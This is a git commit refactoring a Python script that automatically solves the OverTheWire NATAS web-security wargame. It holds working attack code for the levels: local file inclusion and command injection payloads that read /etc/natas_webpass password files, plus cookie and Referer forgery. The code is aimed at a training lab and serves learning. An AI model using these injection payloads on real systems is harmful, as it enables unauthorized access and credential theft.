d822e5f7502282c16324ddc23708c3e9c9e764d5
anim <anton@telpart.ru>
2019-01-12 03:43:41 +0300

    Levels implementation refactoring

--- natas.py
+++ natas.py
@@ -33,6 +33,159 @@ def rex(method, url, regexp, headers={}, body=""):
 
     return(res, reg)
 
+def level0():
+    print(" Search password in the source code of the page")
+    res, reg = rex(
+        "GET",
+        "/",
+        "<!--The password for natas[12] is (\w+) -->"
+    )
+    
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level2():
+    if level == 2: f = "/files/users.txt"
+    elif level == 3: f = "/s3cr3t/users.txt"
+
+    print(" Search password in file {}".format(f))
+    res, reg = rex("GET", f, "natas[34]:(\w+)")
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level4():
+    r = "http://natas5.natas.labs.overthewire.org/"
+    print(" Set Referer header to {}".format(r))
+    res, reg = rex(
+        "GET",
+        "/",
+        "The password for natas5 is (\w+)",
+        headers={"Referer": r}
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level5():
+    c = "loggedin=1"
+    print(" Set Cookie header to {}".format(c))
+    res, reg = rex(
+        "GET",
+        "/",
+        "The password for natas6 is (\w+)",
+        headers={"Cookie": c}
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level6():
+    f = "/includes/secret.inc"
+    print(" Search secret in file {}: ".format(f))
+    res, reg = rex("GET", f, "\$secret = \"(\w+)\";")
+    if res.status != 200: return
+    if reg:
+        print(" Post form with secret {}".format(reg[1]))
+        res, reg = rex(
+            "POST",
+            "/",
+            "The password for natas7 is (\w+)",
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            body="secret={}&submit=submit".format(reg[1])
+        )
+
+        if res.status != 200: return
+        if reg:
+            if len(passwords) == level + 1: passwords.append(reg[1])
+            print(" Password found: {}".format(passwords[level + 1]))
+        else:
+            print(" Password not found")
+    else:
+        print(" Secret not found")
+
+def level7():
+    u = "/index.php?page=/etc/natas_webpass/natas8"
+    print(" Get page {}".format(u))
+    res, reg = rex(
+        "GET",
+        u,
+        "<br>\n<br>\n(\w+)\n",
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
+def level8():
+    f = "/index-source.html"
+    print(" Search secret in {}".format(f))
+    res, reg = rex(
+        "GET",
+        f,
+        "\$encodedSecret&nbsp;=&nbsp;\"(\w+)\";",
+    )
+
+    if res.status != 200: return
+    if reg:
+        s = reg[1]
+        print(" Decoding secret {}".format(s))
+        s = base64.b64decode(bytes.fromhex(s).decode()[::-1]).decode()
+        print(" Post form with secret {}".format(s))
+        res, reg = rex(
+            "POST",
+            "/",
+            "The password for natas9 is (\w+)\n",
+            headers={"Content-type": "application/x-www-form-urlencoded"},
+            body="secret={}&submit=submit".format(s),
+        )
+
+        if res.status != 200: return
+        if reg:
+            if len(passwords) == level + 1: passwords.append(reg[1])
+            print(" Password found: {}".format(passwords[level + 1]))
+        else:
+                    print(" Password not found")
+    else:
+        print(" Secret not found")
+
+def level9():
+    u = "/?needle={}&submit=Search".format(
+        urllib.parse.quote("\"\" /etc/natas_webpass/natas{} #".format(level + 1))
+    )
+
+    print(" Get page {}".format(u))
+    res, reg = rex(
+        "GET",
+        u,
+        "<pre>\n(\w+)\n</pre>",
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")        
+        
 def level11():
     def enc(data, key):
         out = ""
@@ -84,6 +237,22 @@ def level11():
     else:
         print(" Password not found")
 
+def levelN():
+    print("Level {} not implemented yet".format(level))
+    return
+
+levels = [
+    level0, level0, level2, level2,
+    level4, level5, level6, level7,
+    level8, level9, level9, level11,
+    levelN, levelN, levelN, levelN,
+    levelN, levelN, levelN, levelN,
+    levelN, levelN, levelN, levelN,
+    levelN, levelN, levelN, levelN,
+    levelN, levelN, levelN, levelN,
+    levelN, levelN, levelN,
+]
+
 print("___________________________")
 print()
 print(" OverTheWire wargame NATAS")
@@ -125,153 +294,8 @@ while True:
             continue
 
         print("[Level {}]".format(level))
-
-        if level == 0 or level == 1:
-            print(" Search password in the source code of the page")
-            res, reg = rex(
-                "GET",
-                "/",
-                "<!--The password for natas[12] is (\w+) -->"
-            )
-
-            if res.status != 200: continue           
-            if reg:
-                if len(passwords) == level + 1: passwords.append(reg[1])
-                print(" Password found: {}".format(passwords[level + 1]))
-            else:
-                print(" Password not found")
-        elif level == 2 or level == 3:
-            if level == 2: f = "/files/users.txt"
-            elif level == 3: f = "/s3cr3t/users.txt"
-            
-            print(" Search password in file {}".format(f))
-            res, reg = rex("GET", f, "natas[34]:(\w+)")
-            if res.status != 200: continue
-            if reg:
-                if len(passwords) == level + 1: passwords.append(reg[1])
-                print(" Password found: {}".format(passwords[level + 1]))
-            else:
-                print(" Password not found")
-        elif level == 4:
-            r = "http://natas5.natas.labs.overthewire.org/"
-            print(" Set Referer header to {}".format(r))
-            res, reg = rex(
-                "GET",
-                "/",
-                "The password for natas5 is (\w+)",
-                headers={"Referer": r}
-            )
-
-            if res.status != 200: continue
-            if reg:
-                if len(passwords) == level + 1: passwords.append(reg[1])
-                print(" Password found: {}".format(passwords[level + 1]))
-            else:
-                print(" Password not found")
-        elif level == 5:
-            c = "loggedin=1"
-            print(" Set Cookie header to {}".format(c))
-            res, reg = rex(
-                "GET",
-                "/",
-                "The password for natas6 is (\w+)",
-                headers={"Cookie": c}
-            )
-
-            if res.status != 200: continue
-            if reg:
-                if len(passwords) == level + 1: passwords.append(reg[1])
-                print(" Password found: {}".format(passwords[level + 1]))
-            else:
-                print(" Password not found")
-        elif level == 6:
-            f = "/includes/secret.inc"
-            print(" Search secret in file {}: ".format(f))
-            res, reg = rex("GET", f, "\$secret = \"(\w+)\";")
-            if res.status != 200: continue
-            if reg:
-                print(" Post form with secret {}".format(reg[1]))
-                res, reg = rex(
-                    "POST",
-                    "/",
-                    "The password for natas7 is (\w+)",
-                    headers={"Content-Type": "application/x-www-form-urlencoded"},
-                    body="secret={}&submit=submit".format(reg[1])
-                )
-
-                if res.status != 200: continue
-                if reg:
-                    if len(passwords) == level + 1: passwords.append(reg[1])
-                    print(" Password found: {}".format(passwords[level + 1]))
-                else:
-                    print(" Password not found")
-            else:
-                print(" Secret not found")
-        elif level == 7:
-            u = "/index.php?page=/etc/natas_webpass/natas8"
-            print(" Get page {}".format(u))
-            res, reg = rex(
-                "GET",
-                u,
-                "<br>\n<br>\n(\w+)\n",
-            )
-
-            if res.status != 200: continue
-            if reg:
-                if len(passwords) == level + 1: passwords.append(reg[1])
-                print(" Password found: {}".format(passwords[level + 1]))
-            else:
-                print(" Password not found")
-        elif level == 8:
-            f = "/index-source.html"
-            print(" Search secret in {}".format(f))
-            res, reg = rex(
-                "GET",
-                f,
-                "\$encodedSecret&nbsp;=&nbsp;\"(\w+)\";",
-            )
-
-            if res.status != 200: continue
-            if reg:
-                s = reg[1]
-                print(" Decoding secret {}".format(s))
-                s = base64.b64decode(bytes.fromhex(s).decode()[::-1]).decode()
-                print(" Post form with secret {}".format(s))
-                res, reg = rex(
-                    "POST",
-                    "/",
-                    "The password for natas9 is (\w+)\n",
-                    headers={"Content-type": "application/x-www-form-urlencoded"},
-                    body="secret={}&submit=submit".format(s),
-                )
-
-                if res.status != 200: continue
-                if reg:
-                    if len(passwords) == level + 1: passwords.append(reg[1])
-                    print(" Password found: {}".format(passwords[level + 1]))
-                else:
-                    print(" Password not found")
-            else:
-                print(" Secret not found")
-        elif level == 9 or level == 10:
-            u = "/?needle={}&submit=Search".format(
-                urllib.parse.quote("\"\" /etc/natas_webpass/natas{} #".format(level + 1))
-            )
-
-            print(" Get page {}".format(u))
-            res, reg = rex(
-                "GET",
-                u,
-                "<pre>\n(\w+)\n</pre>",
-            )
-
-            if res.status != 200: continue
-            if reg:
-                if len(passwords) == level + 1: passwords.append(reg[1])
-                print(" Password found: {}".format(passwords[level + 1]))
-            else:
-                print(" Password not found")
-        elif level == 11: level11()
+        if level >= 0 and level <= 34:
+            levels[level]()
         else:
             print("Level must be between 1-34")
     else:
